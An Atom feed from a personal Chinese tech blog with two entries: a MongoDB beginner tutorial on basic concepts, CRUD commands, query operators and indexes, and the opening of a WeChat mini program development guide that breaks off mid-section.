<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>houfee&#39;s Blog</title>
  
  <subtitle>写我所想</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-07-14T09:49:06.200Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>houfee</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>moogoDB入门一</title>
    <link href="http://yoursite.com/posts/24755.html"/>
    <id>http://yoursite.com/posts/24755.html</id>
    <published>2020-07-08T10:25:03.000Z</published>
    <updated>2020-07-14T09:49:06.200Z</updated>
    
    <content type="html"><![CDATA[<p>1.<a href="https://www.cnblogs.com/clsn/p/8214194.html#auto_id_0" target="_blank" rel="noopener">MONGODB入门篇</a></p><p>2.<a href="https://cloud.tencent.com/developer/article/1455000" target="_blank" rel="noopener">centos安装mongodb 4.x及配置用户名密码（官方推荐的方式）</a></p><p>3.<a href="https://docs.mongodb.com/manual/" target="_blank" rel="noopener">MONGODB手册</a></p><p>4.<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Express_Nodejs/mongoose" target="_blank" rel="noopener">Express 教程 3：使用数据库 (Mongoose)</a></p><p>5.<a href="https://www.runoob.com/mongodb/mongodb-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h3><p>NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。</p><p>NoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。</p><p>NoSQL用于超大规模数据的存储。（例如个人信息，社交网络，地理位置，用户生成的数据和用户操作日志）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p><h3 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h3><table><thead><tr><th style="text-align:left">SQL术语/概念</th><th style="text-align:left">MongoDB术语/概念</th><th style="text-align:left">解释/说明</th></tr></thead><tbody><tr><td style="text-align:left">database</td><td style="text-align:left">database</td><td style="text-align:left">数据库</td></tr><tr><td style="text-align:left">table</td><td style="text-align:left">collection</td><td style="text-align:left">数据库表/集合</td></tr><tr><td style="text-align:left">row</td><td style="text-align:left">document</td><td style="text-align:left">数据记录行/文档</td></tr><tr><td style="text-align:left">column</td><td style="text-align:left">field</td><td style="text-align:left">数据字段/域</td></tr><tr><td style="text-align:left">index</td><td style="text-align:left">index</td><td style="text-align:left">索引</td></tr><tr><td style="text-align:left">table joins</td><td style="text-align:left"></td><td style="text-align:left">表连接,MongoDB不支持</td></tr><tr><td style="text-align:left">primary key</td><td style="text-align:left">primary key</td><td style="text-align:left">主键,MongoDB自动将_id字段设置为主键</td></tr></tbody></table><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>一个mongodb中可以建立多个数据库。</p><p>数据库命名规范：</p><ul><li>不能是空字符串（””)。</li><li>不得含有’ ‘（空格)、.、$、/、\和\0 (空字符)。</li><li>应全部小写。</li><li>最多64字节。</li></ul><p>数据库保留字：<code>admin</code>、<code>local</code>、<code>config</code></p><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>RDBMS 与 MongoDB 对应的术语：</p><table><thead><tr><th style="text-align:left">RDBMS</th><th style="text-align:left">MongoDB</th></tr></thead><tbody><tr><td style="text-align:left">数据库</td><td style="text-align:left">数据库</td></tr><tr><td style="text-align:left">表格</td><td style="text-align:left">集合</td></tr><tr><td style="text-align:left">行</td><td style="text-align:left">文档</td></tr><tr><td style="text-align:left">列</td><td style="text-align:left">字段</td></tr><tr><td style="text-align:left">表联合</td><td style="text-align:left">嵌入文档</td></tr><tr><td style="text-align:left">主键</td><td style="text-align:left">主键 (MongoDB 提供了 key 为 _id )</td></tr></tbody></table><h2 id="数据库基本操作"><a href="#数据库基本操作" class="headerlink" title="数据库基本操作"></a>数据库基本操作</h2><ul><li>MongoDB连接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># mongodb://admin:123456@localhost/test</span></span><br></pre></td></tr></table></figure><h3 id="CRUD"><a href="#CRUD" class="headerlink" title="CRUD"></a>CRUD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 展示数据库</span></span><br><span class="line">show dbs</span><br><span class="line"><span class="comment"># 创建或进入数据库（如果该数据库中没有数据，将不会 show dbs 中子展示出来）</span></span><br><span class="line">use mydb</span><br><span class="line"><span class="comment"># 向mydb的mycol集合中插入一条数据</span></span><br><span class="line">db.mycol.insert(&#123;<span class="string">"name"</span>: <span class="string">"houfei"</span>&#125;)</span><br><span class="line"><span class="comment"># MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://www.runoob.com/mongodb/mongodb-create-collection.html" target="_blank" rel="noopener">创建/删除集合</a></li></ul><p><code>db.createCollection(name, options)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建或进入数据库（如果该数据库中没有集合时，将不会 show dbs 中子展示出来）</span></span><br><span class="line">use mydb</span><br><span class="line"><span class="comment"># 创建mycol集合</span></span><br><span class="line">db.createCollection(<span class="string">"mycol"</span>)</span><br><span class="line"><span class="comment"># 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合。</span></span><br><span class="line">db.mycol.insert(&#123;<span class="string">"name"</span>: <span class="string">"houfei"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入数据库</span></span><br><span class="line">use mydb</span><br><span class="line"><span class="comment"># 查看已存在的集合</span></span><br><span class="line">show collections</span><br><span class="line"><span class="comment"># 删除集合 mycol</span></span><br><span class="line">db.mycol.drop()</span><br></pre></td></tr></table></figure><ul><li><a href="https://www.runoob.com/mongodb/mongodb-insert.html" target="_blank" rel="noopener">文档的CRUD</a></li></ul><p><strong>插入文档</strong>——<code>db.&lt;collecetion&gt;.insert(document)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向test数据库中插入stus集合中插入一个新的学生对象</span></span><br><span class="line">db.stus.insert(</span><br><span class="line">  &#123;name: <span class="string">"小明"</span>, gender: <span class="string">"男"</span>&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向test数据库中插入teather集合中插入2个新的老师对象</span></span><br><span class="line">db.teather.insert([</span><br><span class="line">  &#123;name: <span class="string">"马云"</span>, gender: <span class="string">"男"</span>&#125;,</span><br><span class="line">  &#123;name: <span class="string">"马化腾"</span>, gender: <span class="string">"男"</span>&#125;</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># db.stus.insertOne() 插入一个</span></span><br><span class="line"><span class="comment"># db.stus.insertMany() 插入多个</span></span><br></pre></td></tr></table></figure><p><strong>查询文档</strong>——<code>db.&lt;collection&gt;.find(query（查询条件）, projection（投影）)</code></p><table><thead><tr><th style="text-align:left">操作</th><th style="text-align:center">格式</th><th style="text-align:left">范例</th><th style="text-align:left">RDBMS中的类似语句</th></tr></thead><tbody><tr><td style="text-align:left">等于</td><td style="text-align:center"><code>{:</code>}</td><td style="text-align:left"><code>db.col.find({&quot;by&quot;:&quot;菜鸟教程&quot;}).pretty()</code></td><td style="text-align:left"><code>where by = &#39;菜鸟教程&#39;</code></td></tr><tr><td style="text-align:left">小于</td><td style="text-align:center"><code>{:{$lt:}}</code></td><td style="text-align:left"><code>db.col.find({&quot;likes&quot;:{$lt:50}}).pretty()</code></td><td style="text-align:left"><code>where likes &lt; 50</code></td></tr><tr><td style="text-align:left">小于或等于</td><td style="text-align:center"><code>{:{$lte:}}</code></td><td style="text-align:left"><code>db.col.find({&quot;likes&quot;:{$lte:50}}).pretty()</code></td><td style="text-align:left"><code>where likes &lt;= 50</code></td></tr><tr><td style="text-align:left">大于</td><td style="text-align:center"><code>{:{$gt:}}</code></td><td style="text-align:left"><code>db.col.find({&quot;likes&quot;:{$gt:50}}).pretty()</code></td><td style="text-align:left"><code>where likes &gt; 50</code></td></tr><tr><td style="text-align:left">大于或等于</td><td style="text-align:center"><code>{:{$gte:}}</code></td><td style="text-align:left"><code>db.col.find({&quot;likes&quot;:{$gte:50}}).pretty()</code></td><td style="text-align:left"><code>where likes &gt;= 50</code></td></tr><tr><td style="text-align:left">不等于</td><td style="text-align:center"><code>{:{$ne:}}</code></td><td style="text-align:left"><code>db.col.find({&quot;likes&quot;:{$ne:50}}).pretty()</code></td><td style="text-align:left"><code>where likes != 50</code></td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询 “likes” 大于50，并且“by”为“菜鸟教程”或者“title”为“MongoDB 教程”的数据</span></span><br><span class="line">db.col.find(&#123;</span><br><span class="line"><span class="string">"likes"</span>: &#123;<span class="variable">$gt</span>:50&#125;,</span><br><span class="line"><span class="variable">$or</span>: [&#123;<span class="string">"by"</span>: <span class="string">"菜鸟教程"</span>&#125;,&#123;<span class="string">"title"</span>: <span class="string">"MongoDB 教程"</span>&#125;]</span><br><span class="line">&#125;).pretty()</span><br></pre></td></tr></table></figure><p><a href="https://docs.mongodb.com/manual/reference/method/db.collection.find/#query-an-array-of-documents" target="_blank" rel="noopener"><em>案例</em></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向 bios 集合插入如下文档</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"_id"</span> : &lt;value&gt;,</span><br><span class="line">    <span class="string">"name"</span> : &#123; <span class="string">"first"</span> : &lt;string&gt;, <span class="string">"last"</span> : &lt;string&gt; &#125;,       // embedded document</span><br><span class="line">    <span class="string">"birth"</span> : &lt;ISODate&gt;,</span><br><span class="line">    <span class="string">"death"</span> : &lt;ISODate&gt;,</span><br><span class="line">    <span class="string">"contribs"</span> : [ &lt;string&gt;, ... ],                           // Array of Strings</span><br><span class="line">    <span class="string">"awards"</span> : [</span><br><span class="line">        &#123; <span class="string">"award"</span> : &lt;string&gt;, year: &lt;number&gt;, by: &lt;string&gt; &#125;  // Array of embedded documents</span><br><span class="line">        ...</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部查询</span></span><br><span class="line"><span class="comment"># 查询所有数据</span></span><br><span class="line">db.bios.find()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准查询</span></span><br><span class="line"><span class="comment"># 查询_id 为5的数据</span></span><br><span class="line">db.bios.find( &#123; _id: 5 &#125; )</span><br><span class="line"><span class="comment"># 查询 name 对象下的 last 属性值为 Hopper 的所有数据</span></span><br><span class="line">db.bios.find( &#123; <span class="string">"name.last"</span>: <span class="string">"Hopper"</span> &#125; )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用运算符的查询</span></span><br><span class="line"><span class="comment"># 使用$in操作符返回id等于5和ObjectId为(“507c35dd8fada716c89d0013”)的文档</span></span><br><span class="line">db.bios.find(</span><br><span class="line">   &#123; _id: &#123; <span class="variable">$in</span>: [ 5, ObjectId(<span class="string">"507c35dd8fada716c89d0013"</span>) ] &#125; &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询 生日大于 new Date('1950-01-01') 的文档</span></span><br><span class="line">db.bios.find(</span><br><span class="line">&#123; birth: &#123; <span class="variable">$gt</span>: new Date(<span class="string">'1950-01-01'</span>) &#125; &#125; </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询 name 对象下的 last 属性值符合 /^N/表达式 的所有数据</span></span><br><span class="line">db.bios.find(</span><br><span class="line">   &#123; <span class="string">"name.last"</span>: &#123; <span class="variable">$regex</span>: /^N/ &#125; &#125;</span><br><span class="line">) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询范围</span></span><br><span class="line"><span class="comment"># 查询 生日大于 new Date('1940-01-01') 小于 new Date('1960-01-01' 的文档</span></span><br><span class="line">db.bios.find( </span><br><span class="line">&#123; birth: &#123;</span><br><span class="line"><span class="variable">$gt</span>: new Date(<span class="string">'1940-01-01'</span>),</span><br><span class="line"><span class="variable">$lt</span>: new Date(<span class="string">'1960-01-01'</span>) </span><br><span class="line">  &#125; &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询 生日大于 new Date('1920-01-01') 并且 death 为 false 的文档</span></span><br><span class="line">db.bios.find( &#123;</span><br><span class="line">   birth: &#123; <span class="variable">$gt</span>: new Date(<span class="string">'1920-01-01'</span>) &#125;,</span><br><span class="line">   death: &#123; <span class="variable">$exists</span>: <span class="literal">false</span> &#125;</span><br><span class="line">&#125; ) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询精确匹配嵌入的文档</span></span><br><span class="line"><span class="comment"># 查询 name 对象为 &#123; first: "Yukihiro", last: "Matsumoto" &#125; 的文档（包括顺序，并且不能包含其他属性）</span></span><br><span class="line">db.bios.find(</span><br><span class="line">    &#123; name: &#123; first: <span class="string">"Yukihiro"</span>, last: <span class="string">"Matsumoto"</span> &#125; &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 嵌入式文档的查询字段</span></span><br><span class="line"><span class="comment"># 其中嵌入的文档名称包含第一个值为“Yukihiro”的字段和最后一个值为“Matsumoto”的字段。</span></span><br><span class="line">db.bios.find(</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="string">"name.first"</span>: <span class="string">"Yukihiro"</span>,</span><br><span class="line">     <span class="string">"name.last"</span>: <span class="string">"Matsumoto"</span></span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询数组元素</span></span><br><span class="line"><span class="comment"># 查询数组字段contribs包含元素“UNIX”</span></span><br><span class="line">db.bios.find( &#123; contribs: <span class="string">"UNIX"</span> &#125; )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组字段设计包含元素“ALGOL”或“Lisp”</span></span><br><span class="line">db.bios.find( &#123; contribs: &#123; <span class="variable">$in</span>: [ <span class="string">"ALGOL"</span>, <span class="string">"Lisp"</span> ]&#125; &#125; )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组字段设计包含元素“ALGOL”和“Lisp”</span></span><br><span class="line">db.bios.find( &#123; contribs: &#123; <span class="variable">$all</span>: [ <span class="string">"ALGOL"</span>, <span class="string">"Lisp"</span> ] &#125; &#125; )</span><br><span class="line"></span><br><span class="line"><span class="comment"># contribs的数组大小为4</span></span><br><span class="line">db.bios.find( &#123; contribs: &#123; <span class="variable">$size</span>: 4 &#125; &#125; )</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/mongodb/mongodb-update.html" target="_blank" rel="noopener"><strong>更新文档</strong></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">   &lt;query&gt;, <span class="comment"># update的查询条件，类似sql update查询内where后面的。</span></span><br><span class="line">   &lt;update&gt;, <span class="comment"># 更新内容</span></span><br><span class="line">   &#123;</span><br><span class="line">     upsert: &lt;boolean&gt;, <span class="comment"># 如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</span></span><br><span class="line">     multi: &lt;boolean&gt;, <span class="comment"># 可选，mongodb 默认是false,是否只更新第一条</span></span><br><span class="line">     writeConcern: &lt;document&gt; <span class="comment"># 可选，抛出异常的级别。</span></span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># db.&lt;collecetion&gt;.update(查询条件, 修改条件)</span></span><br><span class="line"><span class="comment"># - update 会默认将 新对象 替换 旧对象</span></span><br><span class="line"><span class="comment"># - 如果是修改指定的属性，而不是替换，需要使用“替换操作符”来完成修改</span></span><br><span class="line"><span class="comment">#  $set 可以用来修改文档中的指定的属性</span></span><br><span class="line"><span class="comment">#  $unset 可以用来删除文档中的指定的属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db.stus.update(</span><br><span class="line">  &#123;gender: <span class="string">"女"</span>, name: <span class="string">"蜘蛛精"</span> &#125;,</span><br><span class="line">  &#123;gender: <span class="string">"男"</span>, name: <span class="string">"孙悟空"</span>, age: 30 &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">db.stus.update(&#123;name: <span class="string">"one"</span> &#125;, &#123;</span><br><span class="line">  <span class="variable">$set</span>: &#123;</span><br><span class="line">    gender: <span class="string">"男"</span>,</span><br><span class="line">    name: <span class="string">" 猪八戒"</span>,</span><br><span class="line">    addr: <span class="string">"高老庄"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">  multi: <span class="literal">true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/mongodb/mongodb-remove.html" target="_blank" rel="noopener"><strong>删除文档</strong></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">db.&lt;collecetion&gt;.remove(</span><br><span class="line">  删除条件,</span><br><span class="line">  是否删除一个&lt;<span class="literal">true</span>为删除一个，默认<span class="literal">false</span>&gt;</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 会删除符合条件的所有数据</span></span><br><span class="line"><span class="comment"># 如果传递一个空对象，会把所有数据删除</span></span><br><span class="line"></span><br><span class="line">db.&lt;collecetion&gt;.remove(&#123;&#125;) <span class="comment"># 性能较差，删除数据，但是不清空集合</span></span><br><span class="line"></span><br><span class="line">db.&lt;collecetion&gt;.deleteOne(删除条件)</span><br><span class="line">db.&lt;collecetion&gt;.deleteMany(删除条件)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show collecetions</span><br><span class="line">db.dropDatabase() <span class="comment"># 删除 数据库</span></span><br><span class="line">db.&lt;collecetion&gt;.drop() <span class="comment"># 清空集合</span></span><br></pre></td></tr></table></figure><h3 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gt</span> &gt; <span class="variable">$gte</span> &gt;=  <span class="variable">$lt</span>  &lt; <span class="variable">$lte</span> &lt;=  <span class="variable">$ne</span> !=  <span class="variable">$eq</span>  =</span><br></pre></td></tr></table></figure><h3 id="type操作符"><a href="#type操作符" class="headerlink" title="$type操作符"></a>$type操作符</h3><p> 根据字符数据类型查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db.col.insert([</span><br><span class="line">&#123;title: <span class="string">'PHP 教程'</span>&#125;,</span><br><span class="line">&#123;title: <span class="string">'Java 教程'</span>&#125;,</span><br><span class="line">&#123;title: <span class="string">'MongoDB 教程'</span>&#125;</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询 title 为 string 的文档</span></span><br><span class="line">db.col.find(&#123;<span class="string">"title"</span> : &#123;<span class="variable">$type</span> : 2&#125;&#125;)</span><br><span class="line">或</span><br><span class="line">db.col.find(&#123;<span class="string">"title"</span> : &#123;<span class="variable">$type</span> : <span class="string">'string'</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><h3 id="Limit与Skip方法"><a href="#Limit与Skip方法" class="headerlink" title="Limit与Skip方法"></a>Limit与Skip方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.COLLECTION_NAME.find().<span class="built_in">limit</span>(NUMBER) <span class="comment"># 限制查询多少条</span></span><br><span class="line">db.COLLECTION_NAME.find().skip(NUMBER) <span class="comment"># 跳过多少条</span></span><br></pre></td></tr></table></figure><h3 id="sort-方法"><a href="#sort-方法" class="headerlink" title="sort() 方法"></a>sort() 方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.col.find(&#123;&#125;).sort(&#123;<span class="string">"likes"</span>:-1&#125;) <span class="comment"># 数据按字段 likes 的降序排列 1为升序 -1为降序</span></span><br></pre></td></tr></table></figure><h3 id="createIndex-方法"><a href="#createIndex-方法" class="headerlink" title="createIndex() 方法"></a>createIndex() 方法</h3><p>索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db.col.createIndex(&#123;<span class="string">"title"</span>:1&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1、查看集合索引</span></span><br><span class="line">db.col.getIndexes()</span><br><span class="line"><span class="comment"># 2、查看集合索引大小</span></span><br><span class="line">db.col.totalIndexSize()</span><br><span class="line"><span class="comment"># 3、删除集合所有索引</span></span><br><span class="line">db.col.dropIndexes()</span><br><span class="line"><span class="comment"># 4、删除集合指定索引</span></span><br><span class="line">db.col.dropIndex(<span class="string">"索引名称"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.&lt;a href=&quot;https://www.cnblogs.com/clsn/p/8214194.html#auto_id_0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MONGODB入门篇&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;a href=&quot;https:/
      
    
    </summary>
    
      <category term="数据库" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="MongoDB" scheme="http://yoursite.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>WXMiniProgram</title>
    <link href="http://yoursite.com/posts/6316.html"/>
    <id>http://yoursite.com/posts/6316.html</id>
    <published>2020-06-22T10:00:46.000Z</published>
    <updated>2020-06-22T10:05:03.051Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-开发准备"><a href="#1-开发准备" class="headerlink" title="1.开发准备"></a>1.开发准备</h2><ul><li><p><a href="https://mp.weixin.qq.com/cgi-bin/registermidpage?action=index&amp;lang=zh_CN" target="_blank" rel="noopener">账号申请</a></p><ul><li>选择注册账号类型 —— 小程序</li><li>账号信息</li><li>邮箱激活</li><li>信息登记</li></ul></li><li><p>绑定开发者</p><ul><li><a href="https://mp.weixin.qq.com/" target="_blank" rel="noopener">登录小程序</a></li><li>管理员授权</li><li>添加成员</li></ul></li><li><p>获取AppID</p><ul><li>设置——开发设置</li></ul></li><li><p>开发工具</p><ul><li>下载—扫码登录—选择小程序—创建小程序—预览模板界面</li></ul></li><li><p><a href="https://developers.weixin.qq.com/miniprogram/dev/index.html?t=2018413" target="_blank" rel="noopener">官方文档</a></p></li></ul><h2 id="2-结构分析"><a href="#2-结构分析" class="headerlink" title="2.结构分析"></a>2.结构分析</h2><p>以下是小程序的基本目录结构，也可以根据需要任意添加其它目录，如资源目录 assets、第三方库vendors、扩展目录 extends等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├── app.js ...................小程序入口文件</span><br><span class="line">├── app.json .................小程序全局配置</span><br><span class="line">├── app.wxss .................小程序全局样式</span><br><span class="line">├── pages ....................所有页面目录</span><br><span class="line">│   ├── index ................index页面目录</span><br><span class="line">│   │   ├── index.js .........index页面业务逻辑</span><br><span class="line">│   │   ├── index.wxml .......index页面布局结构</span><br><span class="line">│   │   └── index.wxss .......index页面布局样式</span><br><span class="line">│   └── logs .................logs页目录</span><br><span class="line">│       ├── logs.js ..........logs页面业务逻辑</span><br><span class="line">│       ├── logs.json ........logs页面配置文件</span><br><span class="line">│       ├── logs.wxml ........logs页面布局结构</span><br><span class="line">│       └── logs.wxss ........logs页面布局样式</span><br><span class="line">├── project.config.json ......开发工具配置文件</span><br><span class="line">└── utils ....................公共逻辑</span><br><span class="line">    └── util.js ..............实用工具</span><br></pre></td></tr></table></figure><p>==主体 app：一个小程序主体部分由三个文件组成，放在项目的根目录（如果项目使用gulp或者webpack打包，则需要在<code>project.config.js</code> 指定 <code>&quot;miniprogramRoot&quot;: &quot;路径“</code> 属性）==</p><h3 id="2-1全局配置"><a href="#2-1全局配置" class="headerlink" title="2.1全局配置"></a>2.1全局配置</h3><p>通过 app.json 文件对小程序进行全局配置，如页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。</p><p><strong>app.json 